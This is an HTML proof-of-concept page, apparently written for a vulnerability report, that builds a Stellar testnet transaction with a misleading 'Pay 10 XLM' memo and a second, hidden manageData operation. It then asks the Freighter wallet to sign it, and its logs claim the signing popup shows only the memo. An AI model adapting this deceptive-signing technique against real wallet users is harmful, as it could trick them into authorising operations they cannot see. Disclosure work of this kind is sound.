<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>freighter poc - op hiding</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family: monospace; background:#111; color:#eee; padding:15px}
button{padding:12px 18px; margin:6px 0; width:100%;}
pre{background:#000; padding:10px; border:1px solid #333; overflow:auto}
</style>
</head>
<body>
<h3>Freighter POC - memo hide op</h3>
<pre id="out">loading...</pre>
<button id="btn1">build xdr</button>
<button id="btn2">sign with freighter</button>
<button id="btn3">copy xdr for lab</button>

<script src="https://cdnjs.cloudflare.com/ajax/libs/stellar-sdk/12.1.0/stellar-sdk.min.js"></script>
<script>
var out = document.getElementById('out');
var xdr_string = "";

function log(t){ out.textContent += "\n" + t; }

log("ready - testnet");

document.getElementById('btn1').onclick = function(){
  try{
    var kp1 = StellarSdk.Keypair.random();
    var kp2 = StellarSdk.Keypair.random();
    var acc = new StellarSdk.Account(kp1.publicKey(), "1");

    var tx = new StellarSdk.TransactionBuilder(acc, {
      fee: StellarSdk.BASE_FEE,
      networkPassphrase: StellarSdk.Networks.TESTNET,
      memo: StellarSdk.Memo.text("Pay 10 XLM")
    })
    .addOperation(StellarSdk.Operation.payment({
      destination: kp2.publicKey(),
      amount: "10",
      asset: StellarSdk.Asset.native()
    }))
    .addOperation(StellarSdk.Operation.manageData({
      name: "test",
      value: "abc123"
    }))
    .setTimeout(30)
    .build();

    xdr_string = tx.toXDR();
    log("build ok");
    log("src: " + kp1.publicKey().substring(0,10));
    log("op1: payment 10 XLM");
    log("op2: manageData test=abc123");
    log("xdr: " + xdr_string.substring(0,80) + "...");
    log("paste this xdr to lab.stellar.org -> submit transaction");
    log("lab will show 2 ops, freighter only show memo");
  }catch(e){ log("build err: " + e.message); }
};

document.getElementById('btn2').onclick = async function(){
  if(!xdr_string){ log("build dulu"); return; }
  var api = window.freighterApi || window.freighter;
  if(!api){ log("freighterApi not found, buka di freighter desktop extension / aqua.network"); return; }
  try{
    if(api.requestAccess) await api.requestAccess();
    var res = await api.signTransaction(xdr_string, {networkPassphrase: StellarSdk.Networks.TESTNET});
    log("signed: " + res.signedTxXdr.substring(0,50));
  }catch(err){ log("user reject / popup closed: " + err.message); log("screenshot popup freighter disini - cuma show memo, tidak show op2"); }
};

document.getElementById('btn3').onclick = function(){
  navigator.clipboard.writeText(xdr_string);
  log("xdr copied to clipboard");
};
</script>
</body>
</html>
